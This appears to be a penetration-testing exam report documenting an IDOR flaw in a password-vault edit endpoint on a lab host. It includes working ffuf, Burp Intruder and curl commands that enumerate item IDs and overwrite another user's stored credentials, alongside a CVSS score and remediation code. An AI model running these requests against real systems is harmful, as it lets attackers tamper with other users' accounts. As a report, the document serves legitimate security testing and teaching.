# FailSafe PWPA Exam - Phase 3: Vault Edit IDOR Testing

**Date:** January 18, 2026
**Target:** http://10.0.0.10/vault/edit

---

## IDOR Vulnerability Testing - Vault Edit Endpoint

### Vulnerability: Insecure Direct Object Reference (IDOR) - 25 points

**Description:**  
The vault edit endpoint (`PUT /vault/edit/:itemId`) fails to properly validate user authorization. An authenticated user can modify vault items belonging to other users by directly specifying the target item ID in the URL. The application does not verify that the authenticated user owns the vault item before allowing modifications.

**Impact:**  
Attackers can modify, corrupt, or delete other users' stored credentials. This allows unauthorized access to and manipulation of sensitive vault data, leading to complete compromise of other users' accounts and data integrity.

**Technical Details:**

**Vulnerable Endpoint:** PUT /vault/edit/:itemId
**Vulnerability Type:** Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA)
**Authentication Required:** Yes (valid session cookie)
**Authorization Check:** Missing/Insufficient

---

## Step-by-Step Recreation

### Prerequisites:
- Valid session cookie for authenticated user
- Knowledge of target vault item IDs
- Access to curl or Burp Suite

### Accounts Used:
- **Attacker Account :** testuser1 (authenticated)
- **Target Account :** testuser2, Any other user's vault items

### Step 1: Identify Target Vault Item IDs

Create an item in your own vault first, then use Burp Intruder or ffuf to enumerate all existing item IDs across all user accounts:

**Method 1: Using Burp Intruder**
1. Create/edit a vault item to capture the PUT request in Burp
2. Send request to Intruder
3. Set payload position on the item ID in URL: `/vault/edit/§1§`
4. Set payload type to Numbers, from 1 to 1000
5. Add grep extract rule for `"success":true` in response
6. Start attack - any request returning success indicates a valid item ID

**Method 2: Using ffuf**
```bash
ffuf -u http://10.0.0.10/vault/edit/FUZZ \
  -w /path/to/wordlist.txt \
  -H "Cookie: connect.sid=[your_session]" \
  -H "Content-Type: application/json" \
  -d '{"vaulttitle":"test","vaultusername":"test","vaultpassword":"test"}' \
  -mc 200 \
  -fs 0
```

**Method 3: Sequential Testing with curl**
```bash
for id in {1..100}; do
  echo "Testing ID: $id"
  curl -s -X PUT http://10.0.0.10/vault/edit/$id \
    -H "Cookie: connect.sid=[session]" \
    -H "Content-Type: application/json" \
    -d '{"vaulttitle":"test","vaultusername":"test","vaultpassword":"test"}' | grep -q '"success":true' && echo "Valid ID: $id"
done
```

**Expected Results:** Multiple item IDs will return success, indicating they exist and can be modified (IDOR confirmed).


### Step 2: Attempt to Edit Own Vault Item (Control)

```bash
curl -X PUT http://10.0.0.10/vault/edit/15 \
  -H "Cookie: connect.sid=s%3A7XbzBJgwryh4gzy5ZxHKtW4Fvxt07iwA.OEL0VPB7pHiaSrlqWER3pnzDmlumC0alreNkvB3Xxk8" \
  -H "Content-Type: application/json" \
  -d '{"vaulttitle":"my item","vaultusername":"myuser","vaultpassword":"mypass"}'
```

**Expected Response:**
```json
{"success":true,"message":"Item updated successfully!"}
```

### Step 3: Edit Another User's Vault Item (IDOR)

```bash
curl -X PUT http://10.0.0.10/vault/edit/1 \
  -H "Cookie: connect.sid=s%3A7XbzBJgwryh4gzy5ZxHKtW4Fvxt07iwA.OEL0VPB7pHiaSrlqWER3pnzDmlumC0alreNkvB3Xxk8" \
  -H "Content-Type: application/json" \
  -d '{"vaulttitle":"updated title from other acc vault","vaultusername":"hacked","vaultpassword":"hacked"}'
```

**Vulnerable Response:**
```json
{"success":true,"message":"Item updated successfully!"}
```

**Analysis:** Item ID `1` (belonging to another user) was successfully modified without authorization check.

### Step 4: Verify Impact

Navigate to vault page and confirm the item was modified. The vault now displays:
- **Title:** "updated title from other acc vault"
- **Username:** "hacked"
- **Password:** "hacked"

---

## CVSS v3.1 Score

**CVSS v3.1 Score:** 8.8 (High)  
**Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  
**Rationale:** Network attack, low complexity, low privileges required (authenticated user), no user interaction, unchanged scope, high confidentiality/integrity/availability impact.

**Likelihood / Exploitability:**
- **Exploitability:** Easy - simple parameter modification
- **Required Access Level:** Low (authenticated user)
- **Technical Skill Required:** Low
- **Available Tools:** curl, Burp Suite

---

## Remediation

1. **Implement Authorization Checks:**
   ```javascript
   // Vulnerable
   app.put('/vault/edit/:itemId', (req, res) => {
     const itemId = req.params.itemId;
     db.query("UPDATE vault SET title = ? WHERE id = ?", [req.body.vaulttitle, itemId]);
     res.json({ success: true, message: "Item updated successfully!" });
   });

   // Secure
   app.put('/vault/edit/:itemId', (req, res) => {
     const itemId = req.params.itemId;
     const userId = req.session.userId;
     
     // Verify item belongs to authenticated user
     const item = db.query("SELECT * FROM vault WHERE id = ? AND user_id = ?", [itemId, userId]);
     if (!item) {
       return res.status(403).json({ success: false, message: "Unauthorized" });
     }
     
     db.query("UPDATE vault SET title = ? WHERE id = ? AND user_id = ?", [req.body.vaulttitle, itemId, userId]);
     res.json({ success: true, message: "Item updated successfully!" });
   });
   ```

2. **Verify Ownership Before Operations:**
   - Always check that the authenticated user owns the resource
   - Use session user ID, not user-supplied parameters

3. **Implement Role-Based Access Control (RBAC)**

4. **Add Audit Logging:**
   - Log all vault modifications
   - Monitor for suspicious patterns

---

## Status

**Status:** Confirmed  
**Severity:** High  
**Points:** 25 (IDOR/Broken Object Level Authorization)

---

## Screenshots

[Screenshots to be added here]
- Screenshot of successful IDOR edit request
- Screenshot of modified vault item in vault display
- Screenshot of curl command and response showing successful modification
